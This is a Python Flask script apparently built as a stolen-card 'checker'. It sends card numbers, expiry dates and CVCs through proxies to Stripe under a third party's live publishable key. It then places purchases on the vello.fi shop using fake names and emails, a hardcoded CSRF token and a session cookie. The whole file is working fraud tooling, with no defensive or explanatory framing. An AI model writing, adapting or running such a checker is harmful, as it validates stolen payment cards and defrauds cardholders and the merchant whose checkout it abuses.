from flask import Flask, request, jsonify
import requests
import json
import time
from faker import Faker

app = Flask(__name__)
fake = Faker()

def process_card(card_info, proxy):
    # Extract card details from the format
    card_number, exp_month, exp_year, cvc = card_info.split('|')
    
    # Adjust the exp_year format if it's in two digits
    if len(exp_year) == 2:
        exp_year = "20" + exp_year

    # Configure proxy settings
    proxies = {
        "http": f"http://{proxy}"
    }

    # Generate random name and email
    name = fake.name()
    email = fake.email()

    # Step 1: Create a payment method using Stripe API
    stripe_url = "https://api.stripe.com/v1/payment_methods"
    stripe_payload = f"type=card&card[number]={card_number}&card[cvc]={cvc}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&key=pk_live_2m5tgbB2Pm7BDhOh5ZIpD4lU006eHntOnp&_stripe_account=acct_1PdnaVDG97OxLxUE"
    stripe_headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        'Accept': "application/json",
        'Content-Type': "application/x-www-form-urlencoded"
    }

    try:
        stripe_response = requests.post(stripe_url, data=stripe_payload, headers=stripe_headers, proxies=proxies)
        stripe_data = stripe_response.json()
        payment_method_id = stripe_data.get('id')

        # Check if the payment method was created successfully
        if not payment_method_id:
            return {"error": "Failed to create payment method", "details": stripe_data}

        # Step 2: Use the payment method ID in the purchase request
        purchase_url = "https://vello.fi/api/product/87013783-94e8-4fb4-9c5f-70d9a6ab01ed/purchase"

        purchase_payload = json.dumps({
            "method": "stripe",
            "purchaser_name": name,
            "purchaser_email": email,
            "purchaser_phone": "",
            "delivery_name": name,
            "delivery_email": email,
            "resource": False,
            "customer_language": "en",
            "stripe_payment_method": payment_method_id,
            "metadata": {}
        })

        purchase_headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'Content-Type': "application/json",
            'x-csrf-token': "5c59806c-cf46-49a5-8557-6f3a7b76def5",
            'origin': "https://vello.fi",
            'sec-fetch-mode': "cors",
            'referer': "https://vello.fi/hrk-venture-/",
            'Cookie': "connect.sid=s%3AhepW75PLlVQXCrIdtqkzFnwlESse1qwd.xCjfdY4XGVsOXXIEaonZBgBsb5TMtEYZOb0WGVdKvjM"
        }

        purchase_response = requests.post(purchase_url, data=purchase_payload, headers=purchase_headers, proxies=proxies)
        purchase_data = purchase_response.json()

        return purchase_data

    except Exception as e:
        return {"error": "An error occurred", "details": str(e)}

@app.route('/checker', methods=['GET'])
def checker():
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    
    if not cc or not proxy:
        return jsonify({"error": "Both 'cc' and 'proxy' parameters are required."}), 400
    
    result = process_card(cc, proxy)
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
    
